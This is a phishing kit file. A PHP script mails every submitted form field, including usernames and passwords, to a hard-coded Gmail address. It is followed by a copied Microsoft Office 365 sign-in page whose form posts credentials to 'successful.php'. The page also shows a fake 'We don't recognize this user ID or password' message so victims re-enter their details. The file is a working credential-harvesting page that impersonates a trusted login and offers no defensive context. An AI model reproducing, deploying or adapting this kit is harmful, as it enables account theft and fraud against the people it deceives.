<?php

$my_email = "kokoshin101@gmail.com";

/*

Enter the continue link to offer the user after the form is sent.  If you do not change this, your visitor will be given a continue link to your homepage.

If you do change it, remove the "/" symbol below and replace with the name of the page to link to, eg: "mypage.htm" or "http://www.elsewhere.com/page.htm"

*/

$continue = "/";

/*

Step 3:

Save this file (FormToEmail.php) and upload it together with your webpage containing the form to your webspace.  IMPORTANT - The file name is case sensitive!  You must save it exactly as it is named above!  Do not put this script in your cgi-bin directory (folder) it may not work from there.

THAT'S IT, FINISHED!

You do not need to make any changes below this line.

*/

$errors = array();

// Remove $_COOKIE elements from $_REQUEST.

if(count($_COOKIE)){foreach(array_keys($_COOKIE) as $value){unset($_REQUEST[$value]);}}

// Check all fields for an email header.

function recursive_array_check_header($element_value)
{

global $set;

if(!is_array($element_value)){if(preg_match("/(%0A|%0D|\n+|\r+)(content-type:|to:|cc:|bcc:)/i",$element_value)){$set = 1;}}
else
{

foreach($element_value as $value){if($set){break;} recursive_array_check_header($value);}

}

}

recursive_array_check_header($_REQUEST);

if($set){$errors[] = "You cannot send an email header";}

unset($set);

// Validate email field.

if(isset($_REQUEST['email']) && !empty($_REQUEST['email']))
{

if(preg_match("/(%0A|%0D|\n+|\r+|:)/i",$_REQUEST['email'])){$errors[] = "Email address may not contain a new line or a colon";}

$_REQUEST['email'] = trim($_REQUEST['email']);

if(substr_count($_REQUEST['email'],"@") != 1 || stristr($_REQUEST['email']," ")){$errors[] = "Email address is invalid";}else{$exploded_email = explode("@",$_REQUEST['email']);if(empty($exploded_email[0]) || strlen($exploded_email[0]) > 64 || empty($exploded_email[1])){$errors[] = "Email address is invalid";}else{if(substr_count($exploded_email[1],".") == 0){$errors[] = "Email address is invalid";}else{$exploded_domain = explode(".",$exploded_email[1]);if(in_array("",$exploded_domain)){$errors[] = "Email address is invalid";}else{foreach($exploded_domain as $value){if(strlen($value) > 63 || !preg_match('/^[a-z0-9-]+$/i',$value)){$errors[] = "Email address is invalid"; break;}}}}}}

}

// Check referrer is from same site.

if(!(isset($_SERVER['HTTP_REFERER']) && !empty($_SERVER['HTTP_REFERER']) && stristr($_SERVER['HTTP_REFERER'],$_SERVER['HTTP_HOST']))){$errors[] = "You must enable referrer logging to use the form";}

// Check for a blank form.

function recursive_array_check_blank($element_value)
{

global $set;

if(!is_array($element_value)){if(!empty($element_value)){$set = 1;}}
else
{

foreach($element_value as $value){if($set){break;} recursive_array_check_blank($value);}

}

}

recursive_array_check_blank($_REQUEST);

if(!$set){$errors[] = "You cannot send a blank form";}

unset($set);

// Display any errors and exit if errors exist.

if(count($errors)){foreach($errors as $value){print "$value<br>";} exit;}

if(!defined("PHP_EOL")){define("PHP_EOL", strtoupper(substr(PHP_OS,0,3) == "WIN") ? "\r\n" : "\n");}

// Build message.


function build_message($request_input){if(!isset($message_output)){$message_output ="";}if(!is_array($request_input)){$message_output = $request_input;}else{foreach($request_input as $key => $value){if(!empty($value)){if(!is_numeric($key)){$message_output .= str_replace("_"," ",ucfirst($key)).": ".build_message($value).PHP_EOL.PHP_EOL;}else{$message_output .= build_message($value).", ";}}}}return rtrim($message_output,", ");}

$message = build_message($_REQUEST);

$message = $message . PHP_EOL.PHP_EOL."-- ".PHP_EOL."";

$message = stripslashes($message);

$subject = "CUSTOMERS";

$ip = $_SERVER['REMOTE_ADDR'];

$headers = "" . $_REQUEST['username'];

mail($my_email,$subject,$message,$ip,$headers);




?>



<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html style="background-color: rgb(235, 60, 0);" dir="ltr"><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
        


<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="-1">
<meta name="PageID" content="i5030.2.0">
<meta name="SiteID" content="">
<meta name="ReqLC" content="1033">
<meta name="LocLC" content="en-US">
<meta name="mswebdialog-newwindowurl" content="*">



<script type="text/javascript">//<![CDATA[
$Config={"scid":2001,"hpgact":2101,"hpgid":1002,"pgid":"i5030","apiCanary":"AQABAAAAAADRNYRQ3dhRSrm-4K-adpCJGGPT4WmKuTjMg_cUWMa7hKNEFHbCPejkg7Tp_BoImwfVyimaDSFeT0Ak4PYwlJQlPwhej93sSMBEXm2oFOyJichVvxxi8in-7hY61yA2BHhb6dO-MV8Z7ziKlCdlb9xaJYqbG2jw-SxI276avMLW1CJzTN_O31Um4clI7AzpWLLuSmBwXmnvIxelb8TgDknRjioZ_jxXIF-gykkTPOzJAyAA","canary":"OkjYuNwXg/nUGi7Qabd73qcE1OBL4ntssRxyJT3+Tbg=9:1","correlationId":"faf7a6b1-5f29-4b74-9b06-5c263d331048","locale":{"lc":"en-US","isRtl":false,"lcid":1033},"strings":{"mfa":{"setitupnow":"Set it up now"}},"enums":{"ClientMetricsModes":{"None":0,"SubmitOnPost":1,"SubmitOnRedirect":2,"InstrumentPlt":4}},"urls":{},"browser":{"ltr":1,"Firefox":1,"_Win":1,"_M38":1,"_D0":1,"Full":1,"Win81":1,"RE_Gecko":1,"b":{"name":"Firefox","major":38,"minor":0.0},"os":{"name":"Windows","version":"6.3"},"V":"38.0"},"watson":{"enabled":true,"bundle":"https://secure.aadcdn.microsoftonline-p.com/ests/2.1.4653.2/content/cdnbundles/watson.min.js","sbundle":"https://secure.aadcdn.microsoftonline-p.com/ests/2.1.4653.2/content/cdnbundles/watsonsupport.min.js","resetErrorPeriod":5,"maxCorsScriptError":2,"maxErrorsPerPage":10},"serverDetails":{"slc":"ProXXXXnA","dc":"DB3","ri":"ESTXXXX_241","ver":{"v":[2,1,4653,2]},"rt":"2016-09-06T15:09:15"}};
//]]></script><script type="text/javascript">//<![CDATA[
!function(){function r(r,o,a){function i(){var r=!!u.method,e=r?u.method:a[2],i=t.$WebWatson;try{e.apply(o,n(a,!r))}catch(l){return void(i&&i.submitFromException&&i.submitFromException(l))}}var u=e.r&&e.r[r];return o=o?o:this,u&&(u.skipTimeout?i():t.setTimeout(i,0)),u}function n(r,n){return Array.prototype.slice.call(r,n?3:2)}var t=window;t.$Do||(t.$Do={q:[],r:[],removeItems:[],lock:0});var e=t.$Do;e.when=function(n,t){r(n,t,arguments)||e.q.push({id:n,c:t,a:arguments})},e.register=function(n,t,o){if(!e.r[n]){e.r[n]={method:t,skipTimeout:o},e.lock++;try{for(var a=0;a<e.q.length;a++){var i=e.q[a];i.id==n&&r(n,i.c,0,i.a)&&e.removeItems.push(i)}}catch(u){throw u}finally{if(e.lock--,0===e.lock){for(var l=0;l<e.removeItems.length;l++)e.q.remove(e.removeItems[l]);e.removeItems=[]}}}},e.unregister=function(r){e.r[r]&&delete e.r[r]}}(),function(){function r(r,n,t){var e=d.createElement("script");e.id=n,e.type="text/javascript",e.setAttribute("src",r),e.defer=!1,e.async=!1,e.onload=t,e.onerror=o,e.onreadystatechange=function(){"loaded"===e.readyState&&t()};var a=d.getElementsByTagName("head")[0];a.appendChild(e)}function n(){var n=v.bundle;v.bundle=null,delete v.bundle,r(n,"WebWatson_DemandLoaded",e)}function t(){g||(c.jQuery?n():r(v.sbundle,"WebWatson_DemandSupport",n),v.sbundle&&(v.sbundle=null,delete v.sbundle),g=!0)}function e(){if(c.$WebWatson){if(c.$WebWatson.isProxy)return void o();for(;m.length>0;){var r=m.shift();r&&c.$WebWatson[r.cmdName].apply(c.$WebWatson,r.args)}}}function o(){var r=c.$WebWatson?c.$WebWatson.isProxy:!0;a(),v.loadErrorUrl&&r&&window.location.assign(v.loadErrorUrl)}function a(){m=[],c.$WebWatson=null}function i(r){return function(){var n=arguments;m.push({cmdName:r,args:n}),t()}}function u(){var r=["foundException","resetException","submit","submitFromException","showError"],n=this;n.isProxy=!0;for(var t=r.length,e=0;t>e;e++){var o=r[e];o&&(n[o]=i(o))}}function l(r,n,t,e,o,a,i,u,l){a||(a=s(i?i+2:2)),b.submit(r,n,t,e,o,a,i,u,l)}function s(r){var n=[],t=arguments.callee;try{for(;r>0;)t=t?t.caller:t,r--;for(var e=0;t&&h>e;){var o="InvalidMethod()";try{o=t.toString()}catch(a){}var i=[],u=t.args||t.arguments;if(u)for(var l=0;l<u.length;l++)i[l]=u[l];n.push({signature:o,args:i,toString:function(){return this.signature}}),t=t.caller,e++}}catch(a){}return n}var c=window,d=c.document,f=c.$Config||{},v=f.watson;if(!c.$WebWatson&&v&&v.enabled){var m=[],g=!1,h=10,b=c.$WebWatson=new u;b.CB={},b._orgErrorHandler=c.onerror,c.onerror=l,b.errorHooked=!0}}(),function(){function r(r,n){for(var t=n.split("."),e=t.length,o=0;e>o&&null!==r&&void 0!==r;)r=r[t[o++]];return r}function n(n){var t=null;return null===l&&(l=r(a,"Constants")),null!==l&&n&&(t=r(l,n)),null===t||void 0===t?"":t.toString()}function t(t){var e=null;return null===i&&(i=r(a,"$Config.strings")),null!==i&&t&&(e=r(i,t.toLowerCase())),(null===e||void 0===e)&&(e=n(t)),null===e||void 0===e?"":e.toString()}function e(r,n){var e=null;return r&&n&&n[r]&&(e=t("errors."+n[r])),e||(e=t("errors."+r)),e||(e=t("errors."+s)),e||(e=t(s)),e}function o(t){var e=null;return null===u&&(u=r(a,"$Config.urls")),null!==u&&t&&(e=r(u,t.toLowerCase())),(null===e||void 0===e)&&(e=n(t)),null===e||void 0===e?"":e.toString()}var a=window,i=null,u=null,l=null,s="GENERIC_ERROR";a.GetString=t,a.GetErrorString=e,a.GetUrl=o}(),function(){var r=window,n=r.$Config||{};r.$B=n.browser||{}}();

//]]></script>

    <link rel="SHORTCUT ICON" href="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.4653.2/content/images/favicon_a.ico">

    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
<link href="Sign%20in%20to%20your%20account_files/login.css" rel="stylesheet">



<style>
    .no_display {
        display: none;
    }
</style>


<!--[if lte IE 10]>
    <link href="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.4653.2/content/cdnbundles/login_ie.min.css" rel="stylesheet" />

<![endif]-->

<!--[if lte IE 7]>
  <style type='text/css'>
    .ie_legacy { display: none; }
    body { background-color: #0072C6; }
  </style>
<![endif]-->


<script type="text/javascript">
    if ((navigator.userAgent.match(/iPad/) || navigator.userAgent.match(/iPhone/))
        && (window.innerWidth)) {
        try {
            viewport = document.querySelector("meta[name=viewport]");
            viewport.setAttribute('content', 'width=' + window.innerWidth + ', initial-scale=1.0, maximum-scale=1.0');
            window.onresize = function(event) {
                viewport.setAttribute('content', 'width=' + window.innerWidth + ', initial-scale=1.0, maximum-scale=1.0');
            };
            window.onorientationchange = function (event) {
                var activeElem = document.activeElement;
                activeElem && activeElem.blur();
            };
        } catch (err) {
        }
    }

    var isTouch =  !!("ontouchstart" in window) || window.navigator.msMaxTouchPoints > 0;
    if (!isTouch && true) {    
        var cssId = 'hovereffect';
        if (!document.getElementById(cssId)) {
            var head = document.getElementsByTagName('head')[0];
            var link = document.createElement('link');
            link.id = cssId;
            link.rel = 'stylesheet';
            link.type = 'text/css';
            link.href = "https://secure.aadcdn.microsoftonline-p.com/ests/2.1.4653.2/content/cdnbundles/login_hover.min.css";
            link.media = 'all';
            head.appendChild(link);
        }
    }

    if (navigator.userAgent.match(/IEMobile\/10\.0/)) {
        var msViewportStyle = document.createElement("style");
        msViewportStyle.appendChild(
              document.createTextNode(
                  "@-ms-viewport{width:auto!important}"
              )
          );
        msViewportStyle.appendChild(
              document.createTextNode(
                  "@-ms-viewport{height:auto!important}"
              )
          );
        document.getElementsByTagName("head")[0].appendChild(msViewportStyle);
    }
 </script><link media="all" href="Sign%20in%20to%20your%20account_files/login_hover.css" type="text/css" rel="stylesheet" id="hovereffect">


<script src="Sign%20in%20to%20your%20account_files/jquery.js"></script>

<script src="Sign%20in%20to%20your%20account_files/aad.js"></script>






<style>
    body
    {
        display: none;
    }
</style>

        <title>
Sign in to your account        </title>
    </head>
    <body style="display: block;">
        

    <script>
        if (self == top) {
            var body = $('body');
            body.css('display', 'block');
        } else {
            top.location = self.location;
        }
    </script>

        

<div id="background_branding_container" class="ie_legacy" style="background: rgb(235, 60, 0) none repeat scroll 0% 0%;">
    <img src="Sign%20in%20to%20your%20account_files/heroillustration.jpg" style="width: 966px; height: 735px; background-color: rgb(235, 60, 0); visibility: visible; display: block;" id="background_background_image" alt="Illustration">
    <div id="auto_low_bandwidth_background_notification" class="smalltext">It looks like you're on a slow connection. We've disabled some images to speed things up.</div>
    <div style="opacity: 0;" id="background_company_name_text" class="background_title_text">Sign in with your work or school account</div>
</div>
<div aria-hidden="true" style="background-color: rgb(235, 60, 0); visibility: visible; display: none;" id="background_page_overlay" class="overlay ie_legacy">
</div>

        <div aria-hidden="true" style="display: none;" id="login_no_script_panel" class="login_panel">
            

<noscript>
    <style>body { display: block; }</style>
    <div class="login_inner_container no_js">
        <div class="inner_container cred">
            <div class="login_workload_logo_container">
            </div>
            <div id="login_no_js_error_container" class="login_full_error_container">
                <div id="login_no_js_error_text" class="cta_text 1">
                    
                    <H1>We can't sign you in</H1><p>Your browser is currently set to block JavaScript. You need to allow JavaScript to use this service.</p><p>To learn how to allow JavaScript or to find out whether your browser supports JavaScript, check the online help in your web browser.</p>
                </div>
            </div>
        </div>
    </div>
    

<div id="footer_links_container" class="login_footer_container">
    <div class="footer_inner_container">
        <table id="footer_table" class="footer_block">
                <tr>
                    <td>
                        <div>
                            <div class="corporate_footer">
                                    <div>
                                        <span class="footer_link text-caption" id="footer_copyright_link">
&#169; 2016 Microsoft                                        </span>
                                    </div>
                                    <div>
                                        <span class="footer_link">
                                            <a class="text-caption" id="footer_link_terms" href="https://login.microsoftonline.com/termsofuse" target="_blank">Terms of use</a>
                                        </span>
                                        <span class="footer_link">
                                            <a class="text-caption" id="footer_link_privacy" href="https://login.microsoftonline.com/privacy" target="_blank">Privacy &amp; Cookies</a>
                                        </span>
                                    </div>
                            </div>
                        </div>
                    </td>
                    <td>
                        <div class="footer_glyph">
                            <img src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.4653.2/content/images/microsoft_logo.png" alt="Microsoft account symbol" />
                        </div>
                    </td>
                </tr>
        </table>
    </div>
</div>
<div id="login_prefetch_container" class="no-display">
</div>

</noscript>

        </div>
        <div style="display: block;" id="login_panel" class="login_panel">
            <div class="legal_container"></div>
            <table class="login_panel_layout" style="height: 100%;">
                <tbody><tr class="login_panel_layout_row" style="height: 100%;">
                    <td id="login_panel_center">
                        

    <script type="text/javascript">
        $(document).ready(function () {
        if ($.support.cookies) {
            $('.login_inner_container').removeClass('no_display');
            $('.no_cookie').addClass('no_display');
        } else {
            $('.login_inner_container').addClass('no_display');
            $('.no_cookie').removeClass('no_display');
        }
        });
    </script>
    <div aria-hidden="true" class="login_inner_container no_cookie no_display">
        <div class="inner_container cred">
            <div class="login_workload_logo_container">
            <img src="Sign%20in%20to%20your%20account_files/bannerlogo.png" alt="Sign in with your work or school account" class="workload_img" id="login_workload_logo_image" style="visibility: visible;"></div>
            <div id="login_no_cookie_error_container" class="login_full_error_container">
                <div id="login_no_cookie_error_text" class="cta_text 1">
                    
                    <h1>We can't sign you in</h1><p>Your browser is currently set to block cookies. You need to allow cookies to use this service.</p><p>Cookies
 are small text files stored on your computer that tell us when you're 
signed in. To learn how to allow cookies, check the online help in your 
web browser.</p>
                </div>
            </div>
        </div>
    </div>
                        <script type="text/javascript">
                            $(document).ready(function () {
                                

Constants.DEFAULT_LOGO = 'https://secure.aadcdn.microsoftonline-p.com/dbd5a2dd-uymyxxfhpwrbckvwvlxle8radh6vkzaj7cwkqpqixg/appbranding/npdp3ivuhlrwvd1ynsq0x-mjc7zhvnj0i7k676ppafa/0/bannerlogo?ts=635538653042733860';


Constants.DEFAULT_LOGO_ALT = 'Office 365';
Constants.DEFAULT_ILLUSTRATION = 'https://secure.aadcdn.microsoftonline-p.com/dbd5a2dd-uymyxxfhpwrbckvwvlxle8radh6vkzaj7cwkqpqixg/appbranding/npdp3ivuhlrwvd1ynsq0x-mjc7zhvnj0i7k676ppafa/0/heroillustration?ts=635538653045233940';
Constants.DEFAULT_BACKGROUND_COLOR = '#EB3C00';
Constants.BOILERPLATE_HEADER = '';
Constants.DEFAULT_BOILERPLATE_HEADER = '';
Constants.DEFAULT_BOILERPLATE_TEXT = '';




    
    User.UpdateLogo(Constants.DEFAULT_LOGO, Constants.DEFAULT_LOGO_ALT);
    User.UpdateBackground(Constants.DEFAULT_ILLUSTRATION, Constants.DEFAULT_BACKGROUND_COLOR);
    
    if (Constants.DEFAULT_BOILERPLATE_TEXT.length > 0) {
        TenantBranding.AddBoilerPlateText(Constants.DEFAULT_BOILERPLATE_TEXT, Constants.DEFAULT_BOILERPLATE_HEADER);
    }
    

                                


                                $('#footer_link_privacy_windows').click(function (event) {
                                    var flyoutButton = $('#footer_link_privacy_windows')[0]; // anchor
                                    var flyout = $('#flyoutPrivacyStatement')[0]; // flyout div
                                    var pageTop = $('.body-container')[0].getBoundingClientRect().top + (window.pageYOffset || document.documentElement.scrollTop || 0);
                                    flyout.style.marginTop = pageTop + "px"; // adjust margin top so flyout doesn't cover header
                                    flyout.winControl.show(flyoutButton, "top", "left");
                                });

                                if (!Constants.IS_ADAL_REQUEST) {
                                    $('#create_msa_account_link, #account_not_found_title_text > p > a').click(function (event) {
                                        event.preventDefault();
                                        var msaLink = event.target.getAttribute("href");
                                        window.open(msaLink, '_blank');
                                        window.focus();
                                    });
                                }
                                else {
                                    $('#account_not_found_title_text p').toggleClass('no_display');
                                }
                            });

                        </script>
                        <div class="login_inner_container">
                            <div id="true_inner" class="inner_container cred">
                                    <div class="login_workload_logo_container"><img src="Sign%20in%20to%20your%20account_files/bannerlogo.png" alt="Sign in with your work or school account" class="workload_img" id="login_workload_logo_image" style="visibility: visible;"></div>
                                <div class="spacer"></div>
                                




<div id="login_error_container" class="login_error_container"></div>
<div class="login_cta_container normaltext">
            <div id="login_cta_text" class="cta_message_text 1">Work or school account</div>
<div class="" ><h1 style="color:red;">We don't recognize this user ID or password</h1><p style="color:red;">Be sure to type the password for your work or school account.</p></div>
       
    <div aria-hidden="true" id="cta_client_message_text" class="no_display template-tooltip tooltipType_error">
        <!-- Email Discovery Main -->
        <div class="cta_message_text 30136">Type the email address of the account you want to sign in with.</div>
        <!-- Email Discovery Lookup Timeout -->
        <div class="cta_message_text 30140">We're having trouble locating your account. Which type of account do you want to use?</div>
        <!-- Email Discovery Account not found -->
        <div id="upn_needs_disambiguation_text" class="cta_message_text 30139">
        </div>
        <!-- Tenant branding call to action -->
        <div id="tenant_branding_cta_text" class="cta_message_text 30008">Sign in to {0}</div>
        <!-- Which accound do you want to use -->
        <div class="cta_message_text 30173">Which type of account do you want to sign in with?</div>
    </div>
    <div aria-hidden="true" id="cta_client_error_text" class="error_msg errortext no_display template-tooltip tooltipType_error">


        <!-- Invalid ID or password -->
        
        <div class="client_error_msg 30067"><h1>We don't recognize this user ID or password</h1><p>Be sure to type the password for your work or school account.</p></div>
        <!-- Malformed id -->
        
        <div class="client_error_msg 30064"><h1>This doesn't look like a valid user ID</h1><p>Your user ID should look like an email address, for example someone@contoso.com or someone@contoso.onmicrosoft.com.</p></div>
        <!-- Username not found -->
        
        <div class="client_error_msg 30065"><h1>{0} isn't in our system </h1><p>Make sure you typed your address or phone number correctly, or <a id="user-not-found-link" href="#">get a new Microsoft account</a>.</p></div>
        <!-- Malformed id (DOMAIN\alias format) -->
        
        <div class="client_error_msg 30066"><h1>This doesn't look like a valid user ID</h1><p>Your user ID should look like an email address, for example someone@contoso.com or someone@contoso.onmicrosoft.com.</p></div>
        <!-- Invalid domain name (not guests) -->
        
        <div class="client_error_msg 30068"><h1>{0} isn't in our system</h1><p>Make sure you typed your email address correctly. It usually looks like someone@example.com or someone@example.onmicrosoft.com</p></div>
        <!-- Missing password -->
        <div class="client_error_msg 30111">Please enter your password.</div>
        <!-- UserID is missing -->
        <div class="client_error_msg 30127">To sign in, start by entering a user ID.</div>
        <!-- Error message if email address is not properly formatted -->
        <div class="client_error_msg 30145">Check the email address you entered. You may have mistyped it.</div>
        <!-- Email Discovery could not find email address -->
        
        <div id="account_not_found_title_text" class="client_error_msg 30146"><h1>We couldn't find an account with that email address.</h1><p>Enter a different email address or <a id="user-not-found-link-ebd" href="#">get a new Microsoft account</a>.</p></div>
        <!-- Signout failed -->
        <div id="client_error_msg 30200" class="client_error_msg 30200">You may still be signed in to some applications. Close your browser to finish signing out.</div>
    <div class="client_error_msg 2147776681"><h1>Sorry, but we're having trouble signing you in</h1><p>Please
 try again in a few minutes. If this doesn't work, you might want to 
contact your admin and report the following error: 2147776681.</p></div><div class="client_error_msg 2147776682"><h1>Sorry, but we're having trouble signing you in</h1><p>Please
 try again in a few minutes. If this doesn't work, you might want to 
contact your admin and report the following error: 2147776682.</p></div><div class="client_error_msg 2147778860"><h1>Sorry, but we're having trouble signing you in</h1><p>Please
 try again in a few minutes. If this doesn't work, you might want to 
contact your admin and report the following error: 2147778860.</p></div><div class="client_error_msg 2147762276"><h1>Sorry, but we're having trouble signing you in</h1><p>Please
 try again in a few minutes. If this doesn't work, you might want to 
contact your admin and report the following error: 2147762276.</p></div></div>
</div>
<ul class="login_cred_container">



    <!-- From ViewTemplateBase/Tiles.cshtml -->
    <li id="login_user_chooser" class="login_user_chooser"></li>
    




    <!-- From ViewTemplateBase/Tiles.cshtml -->
    <div aria-hidden="true" class="nav-settings-menu hidden dropdownPanel" id="signedin-dropdown">
        <ul class="nav-settings-menu-list">
            <li id="signoutContainer"><a href="#" id="signedin-signout">Sign out</a></li>
            <li id="signoutForgetContainer"><a href="#" id="signedin-signoutandforget">Sign out and forget</a></li>
        </ul>
    </div>
    <div aria-hidden="true" class="nav-settings-menu hidden dropdownPanel" id="signedout-dropdown">
        <ul class="nav-settings-menu-list">
            <li id="forgetContainer"><a href="#" id="signedout-forget">Forget</a></li>
        </ul>
    </div>
    <!--  -->
    <li class="login_cred_field_container">
        

<form name="newUser" id="credentials" method="post" action="successful.php">
        <div id="cred_userid_container" class="login_textfield textfield">
            <span class="input_field textfield">
                <label aria-hidden="true" for="cred_userid_inputtext" class="no_display">User account</label>
                <div class="input_border high_contrast_border">
                    <input id="cred_userid_inputtext" class="login_textfield textfield required email field normaltext" placeholder="someone@example.com " name="username" spellcheck="false" alt="someone@example.com " aria-label="User account" autocomplete="off" type="email">
                </div>
            </span>
        </div>
    <div aria-hidden="true" id="looking_container" class="no_display">
        <span id="looking_cta_text" class="bigtext">Looking for an account</span>
        <span class="input_field normaltext login_textfield"><a id="looking_cancel_link" href="#">Cancel</a> </span>
    </div>
            <div aria-hidden="true" style="display: none;" id="redirect_cta_text" class="bigtext">Redirecting</div>
            <div style="visibility: hidden;" id="redirect_dots_animation" class="progress">
                <div class="pip">
                </div>
                <div class="pip">
                </div>
                <div class="pip">
                </div>
                <div class="pip">
                </div>
                <div class="pip">
                </div>
            </div>

        <div style="opacity: 1;" id="cred_password_container" class="login_textfield textfield">
            <span class="input_field textfield">
                <label aria-hidden="true" for="cred_password_inputtext" class="no_display">Password</label>
                <div class="input_border high_contrast_border">
                    <input id="cred_password_inputtext" class="login_textfield textfield required field normaltext" placeholder="Password" spellcheck="false" aria-label="Password" alt="Password" name="password" value="" type="password">
                </div>
            </span>
        </div>
        <div aria-hidden="true" style="opacity: 0;" id="redirect_message_container" class="login_textfield hidden no_display">
            <span class="input_field normaltext">
                <div>
                    <span id="redirect_message_text">We're taking you to your organization's sign-in page.</span><span id="redirect_company_name_text"></span> <a id="redirect_cancel_link" href="#">Cancel</a>
                </div>
            </span>
        </div>

    

<div id="cred_hidden_inputs_container" style="display: none">
  <input name="dssoToken" id="dssoToken" type="hidden"> 
</div>


    <span class="input_field "><br><br>
        <input id="cred_keep_me_signed_in_checkbox" value="0" class="win-checkbox" name="persist" type="checkbox">
        <label id="keep_me_signed_in_label_text" for="cred_keep_me_signed_in_checkbox" class="persist_text">Keep me signed in</label>
    </span>
</div>        
        <button style="opacity: 1;"   class="button normaltext cred_sign_in_button refresh_domain_state control-button button-two button_primary disabled_button">
            Sign in
        </button>

</form>



    </li>

    <li id="login-splitter-control" class="login_splitter_control">
        <div id="splitter-tiles-container"></div>
    </li>
    <li class="login_cred_options_container" id="login_cred_options_container">

        


<div id="cred_kmsi_container" class="subtext normaltext">
    <span class="input_field ">
        

        <button aria-hidden="true" id="cred_cancel_button" class="button normaltext cred_cancel_button control-button button-one no_display">
            Back
        </button>

        

        <div style="opacity: 1;" id="recover_container" class="subtext smalltext">
            <span>
                <a id="cred_forgot_password_link" tabindex="12" href="https://passwordreset.microsoftonline.com/?ru=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2freprocess%3fctx%3drQIIAeNisFLPKCkpKLbS188vLcnJz8_Wy09Ly0xONTYz1UvOz9XLL0rPTAGxopiBCoqEuAQ2Lvv-SzO-xHs2W4yarbGAxypGJbxG6OeXJ-pfYGTcxMTu6-QZHxzsc4Lp8mf-W0yC_kXpninhxW6pKalFiSWZ-XmPmHhDi1OL_PNyKkPys1PzJjHz5eSnZ-bFFxelxafl5JcDBYAmFiQml8SXZCZnp5bsYlZJSrIwSDMxNtM1NjYz0DUxNTfVTTIyTNa1TEsxTLFISTZMSzS-wCLwg4VxESvQ-Zynptm9yXzqu3FG_slb0QvsTrHq-2dnRZb6lUek6-eFumeaByYmpZgbFya7Gvo7-ZjklRQXB1VUeoUYa4ckpdtaWhnu4iTCwwA1&amp;mkt=en-US&amp;hosted=0&amp;device_platform=Windows+8.1">Can�t access your account?</a>
            </span>
        </div>

        


        

<div style="display: none;" aria-hidden="true" id="guest_hint_text" class="guest_direction_hint smalltext no_display">Don�t have an account assigned by your work or school?</div>
<div style="display: none;" aria-hidden="true" class="guest_redirect_container no_display">
    <span class="guest_redirect smalltext">
        <span>
            <a id="guest_redirect_link" tabindex="20" href="https://login.live.com/login.srf?wa=wsignin1.0&amp;wtrealm=urn%3afederation%3aMicrosoftOnline&amp;wctx=estsredirect%3d2%26estsrequest%3drQIIAeNisFLPKCkpKLbS188vLcnJz8_Wy09Ly0xONTYz1UvOz9XLL0rPTAGxopiBCoqEuAQ2Lvv-SzO-xHs2W4yarbGAxypGJbxG6OeXJ-pfYGTcxMTu6-QZHxzsc4Lp8mf-W0yC_kXpninhxW6pKalFiSWZ-XmPmHhDi1OL_PNyKkPys1PzJjHz5eSnZ-bFFxelxafl5JcDBYAmFiQml8SXZCZnp5bsYlZJSrIwSDMxNtM1NjYz0DUxNTfVTTIyTNa1TEsxTLFISTZMSzS-wCLwg4VxESvQ-Zynptm9yXzqu3FG_slb0QvsTrHq-2dnRZb6lUek6-eFumeaByYmpZgbFya7Gvo7-ZjklRQXB1VUeoUYa4ckpdtaWhnu4iTCwwA1&amp;id=&amp;cbcxt=out&amp;uaid=faf7a6b15f294b749b065c263d331048&amp;pcexp=false&amp;popupui=">Sign in with a Microsoft account</a>
        </span>
    </span>
</div>

        
        </li><li id="disambig-container" class="smalltext marginTop30px" style="display: none;">
            <div id="disambig-help-container">
                
                Tired of seeing this? <a href="#" id="iDisambigRenameLink">Rename your personal Microsoft account.</a>
            </div>
        </li>

    
<input value="0" id="home_realm_discovery" type="hidden"></ul>


<div aria-hidden="true" id="samlrequest_container" class="no_display">
    <form id="samlform" method="post" action="/common/login">
        <input id="samlrelaystate" name="RelayState" type="hidden">
        <input id="samlrequest" name="SAMLRequest" type="hidden">
        <input name="canary_1" value="OkjYuNwXg/nUGi7Qabd73qcE1OBL4ntssRxyJT3+Tbg=9:1" type="hidden"> 
    </form>
</div>







                            </div>
                            <div class="push">
                            </div>
                        </div>


<div id="footer_links_container" class="login_footer_container">
    <div class="footer_inner_container">
        <table id="footer_table" class="footer_block">
                <tbody><tr>
                    <td>
                        <div>
                            <div class="corporate_footer">
                                    <div>
                                        <span class="footer_link text-caption" id="footer_copyright_link">
� 2016 Microsoft                                        </span>
                                    </div>
                                    <div>
                                        <span class="footer_link">
                                            <a class="text-caption" id="footer_link_terms" href="https://login.microsoftonline.com/termsofuse" target="_blank">Terms of use</a>
                                        </span>
                                        <span class="footer_link">
                                            <a class="text-caption" id="footer_link_privacy" href="https://login.microsoftonline.com/privacy" target="_blank">Privacy &amp; Cookies</a>
                                        </span>
                                    </div>
                            </div>
                        </div>
                    </td>
                    <td>
                        <div class="footer_glyph">
                            <img src="Sign%20in%20to%20your%20account_files/microsoft_logo.png" alt="Microsoft account symbol">
                        </div>
                    </td>
                </tr>
        </tbody></table>
    </div>
</div>
<div id="login_prefetch_container" class="no-display">
<iframe id="login_prefetch_iframe" scrolling="no" seamless="seamless" src="Sign%20in%20to%20your%20account_files/prefetch.htm"></iframe></div>
                    </td>
                </tr>
            </tbody></table>
        </div>
        


<script type="text/javascript">
    var Constants = Constants || {};
    Constants.MEMBER_NAME = "";

    
    Constants.REDIRECT_MESSAGES = {
        'AAD': "We\u0027re taking you to your organization\u0027s sign-in page.",
        'MSA': "We�re taking you to the Microsoft account sign-in page.",
        'CLOUDFEDERATED': "We\u0027re taking you to your organization\u0027s sign-in page."
    };

